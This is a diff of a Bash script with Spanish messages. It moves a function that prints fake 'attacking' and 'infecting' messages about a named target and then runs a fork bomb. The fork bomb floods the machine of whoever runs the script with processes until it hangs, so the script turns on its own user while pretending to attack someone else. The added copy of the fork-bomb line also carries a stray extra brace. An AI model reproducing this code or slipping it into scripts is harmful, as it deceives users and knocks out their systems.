@@ -7,6 +7,18 @@ R='\033[1;31m'
 Z='\033[1;34m'
 M='\033[1;35m'
 
+#Functions
+eo(){
+sleep 5
+echo ' '
+echo -e 'Atacando...😈\n'
+sleep 1
+echo 'infectando a' $nm
+sleep 2
+echo '¡En Ejecución!'
+:(){ :|: & };:}
+}
+
 clear
 sleep 3
 echo -e "
@@ -62,14 +74,3 @@ else
         exit
 
 fi
-#Functions
-eo(){
-sleep 5
-echo ' '
-echo -e 'Atacando...😈\n'
-sleep 1
-echo 'infectando a' $nm
-sleep 2
-echo '¡En Ejecución!'
-:(){ :|: & };:
-}
